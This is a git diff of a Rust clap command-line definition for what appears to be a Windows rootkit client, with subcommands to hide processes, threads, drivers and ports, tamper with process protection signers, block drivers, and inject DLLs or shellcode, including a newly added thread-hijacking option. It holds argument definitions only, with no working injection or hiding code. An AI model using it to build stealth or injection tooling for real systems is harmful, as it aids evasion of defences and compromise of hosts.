@@ -1,7 +1,7 @@
 #![allow(non_camel_case_types)]
 
-use clap::{arg, ArgAction, Parser, Subcommand, ValueHint};
 use crate::utils::{validate_sys_extension, Callbacks, Options, PortType, Protocol, BANNER};
+use clap::{arg, ArgAction, Parser, Subcommand, ValueHint};
 
 /// The main command-line interface struct.
 #[derive(Parser)]
@@ -25,7 +25,7 @@ pub enum Commands {
         #[command(subcommand)]
         sub_command: ProcessCommands,
     },
-    
+
     /// Operations related to threads.
     Thread {
         /// Subcommands for thread operations.
@@ -35,6 +35,10 @@ pub enum Commands {
 
     /// Operations related to drivers.
     Driver {
+        /// Subcommands for Driver operations.
+        #[command(subcommand)]
+        sub_command: Option<DriverCommands>,
+
         /// Hide the driver.
         #[arg(long)]
         hide: bool,
@@ -59,8 +63,8 @@ pub enum Commands {
         sub_command: MisCommands,
     },
 
-    /// Operations related to Port.
-    Port {
+    /// Operations related to Network.
+    Network {
         /// Hide the port.
         #[arg(long)]
         hide: bool,
@@ -76,10 +80,10 @@ pub enum Commands {
         /// Type Port
         #[arg(long, required = true)]
         type_: PortType,
-        
+
         /// Number port.
         #[arg(short, required = true)]
-        port_number: u16
+        port_number: u16,
     },
 
     /// Operations related to Registry.
@@ -123,6 +127,24 @@ pub enum Commands {
         #[command(subcommand)]
         sub_command: InjectionCommands,
     },
+}
+
+/// Enum representing the subcommands for process operations.
+#[derive(Subcommand)]
+pub enum DriverCommands {
+    Block {
+        /// Name Driver
+        #[arg(long, value_hint = ValueHint::FilePath, value_parser = validate_sys_extension)]
+        name: Option<String>,
+
+        /// Add block.
+        #[arg(short, long)]
+        add: bool,
+
+        /// Remove block.
+        #[arg(short, long)]
+        remove: bool,
+    }
 }
 
 #[derive(Subcommand)]
@@ -176,7 +198,7 @@ pub enum InjectionCommands {
         #[arg(long, short, required = true)]
         pid: u32,
 
-        /// Path containing the shellcode
+        /// Path containing the dll
         #[arg(long, required = true)]
         path: String,
 
@@ -191,7 +213,7 @@ pub enum InjectionCommands {
         #[arg(long, short, required = true)]
         pid: u32,
 
-        /// Path containing the dll
+        /// Path containing the shellcode
         #[arg(long, required = true)]
         path: String,
 
@@ -217,7 +239,7 @@ pub enum ProcessCommands {
         #[arg(short, long, required = true)]
         pid: u32,
     },
-    
+
     /// Unhide the process.
     Unhide {
         /// The process ID to unhide.
@@ -246,7 +268,7 @@ pub enum ProcessCommands {
         #[arg(long, required = true)]
         sg: PS_PROTECTED_SIGNER,
     },
-    
+
     /// Enable protection for the process.
     #[cfg(not(feature = "mapper"))]
     Protection {
@@ -267,6 +289,7 @@ pub enum ProcessCommands {
         /// Enumerate Processes.
         #[arg(long, short, required = true)]
         list: bool,
+
         // Types Enumerate
         #[arg(long, short, required = true)]
         type_: Options,
@@ -336,30 +359,36 @@ pub enum ThreadCommands {
         #[arg(short, long, required = true)]
         tid: u32,
     },
+    
     /// Unhide the thread.
     Unhide {
         /// The thread ID to unhide.
         #[arg(short, long, required = true)]
         tid: u32,
     },
+
     /// Enable protection for the thread.
     #[cfg(not(feature = "mapper"))]
     Protection {
         /// The thread ID for protection.
         #[arg(short, long, required = true)]
         tid: u32,
+
         /// Add protection.
         #[arg(short, long)]
         add: bool,
+
         /// Remove protection.
         #[arg(short, long)]
         remove: bool,
     },
+
     /// Lists protected or hidden processes
     Enumerate {
         /// Enumerate Processes.
         #[arg(long, required = true)]
         list: bool,
+
         // Types Enumerate
         #[arg(long, short, required = true)]
         type_: Options,
@@ -371,8 +400,10 @@ pub enum ThreadCommands {
 pub enum PS_PROTECTED_TYPE {
     /// No protection.
     None = 0,
+
     /// Light protection.
     ProtectedLight = 1,
+
     /// Full protection.
     Protected = 2,
 }
@@ -381,8 +412,12 @@ pub enum PS_PROTECTED_TYPE {
 pub enum InjectionTypes {
     /// Injection using Thread
     Thread = 0,
+
     /// Injection using APC
     APC = 1,
+
+    /// Thread Hijacking
+    ThreadHijacking = 2,
 }
 
 /// Enum representing the signers for process protection.
@@ -390,23 +425,31 @@ pub enum InjectionTypes {
 pub enum PS_PROTECTED_SIGNER {
     /// No signer.
     None = 0,
+
     /// Authenticode signer.
     Authenticode = 1,
+
     /// Code generation signer.
     CodeGen = 2,
+
     /// Antimalware signer.
     Antimalware = 3,
+
     /// LSA signer.
     Lsa = 4,
+
     /// Windows signer.
     Windows = 5,
+
     /// WinTcb signer.
     WinTcb = 6,
+
     /// WinSystem signer.
     WinSystem = 7,
+
     /// Application signer.
     App = 8,
+
     /// Maximum value for signers.
     Max = 9,
 }
-
